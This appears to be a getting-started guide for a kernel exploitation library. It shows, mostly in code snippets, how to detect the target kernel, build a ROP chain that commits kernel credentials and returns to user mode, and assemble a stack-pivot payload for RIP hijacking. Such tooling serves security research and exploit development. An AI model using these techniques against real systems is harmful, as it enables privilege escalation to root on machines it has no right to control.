# How to get started

### Creating a Database

1. Include the **target_db** in the exploit. `INCBIN` creates a read-only section in the binary with the file contents.

```c++
INCBIN(target_db, "target_db.kpwn");
```

2. Initialize **TargetDb** and detect which target it's being run on.

```
TargetDb kpwn_db(target_db, target_db_size);
auto target = kpwn_db.AutoDetectTarget();
printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());
```

### Building the Payload

After leaking a kernel address and calculating the KASLR base, you can begin constructing the exploit payload.

1. Initialize a `Payload` object. This will serve as the buffer for our ROP chain and other necessary data.

```
Payload payload(1024);
```

2. Create the `RopChain`. This object is initialized with target-specific information and the KASLR base. You can then add predefined actions to it. The `Ret2Usr` utility helps in gracefully returning execution to a user-mode function after the kernel operations are complete.

```
RopChain rop(target, kaslr_base);
rop.AddRopAction(RopActionId::COMMIT_KERNEL_CREDS);
RopUtils::Ret2Usr(rop, (void*)win);
```

### Assembling the Final Payload with PayloadBuilder

The `PayloadBuilder` automates the process of finding a suitable pivot gadget and combining it with your payload and ROP chain.

1. Initialize the `PayloadBuilder` with the target's available pivot gadgets and the KASLR base.

```
PayloadBuilder builder(target.pivots, kaslr_base);
```

2. Add the `payload` object to the builder. You need to specify which register will point to your payload buffer (e.g., `Register::RSI`) and the offset within that buffer where the instruction pointer (`rip`) will be hijacked.

```
uint64_t rip_off = fake_ops_offs + release_offs; // Calculated offset for RIP control
builder.AddPayload(payload, Register::RSI, rip_off);
```

3. Add the `RopChain` to the builder.

```
builder.AddRopChain(rop);
```

4. Build the final payload. The `Build()` method will find an appropriate pivot gadget that uses the specified register (`RSI` in this case) to redirect execution to your ROP chain. The necessary gadgets and the ROP chain itself will be written into the `payload` object you provided earlier.

```
if(!builder.Build()) 
    exit(-1); 
```

Once built, the `payload` object contains the complete, ready-to-use exploit payload.
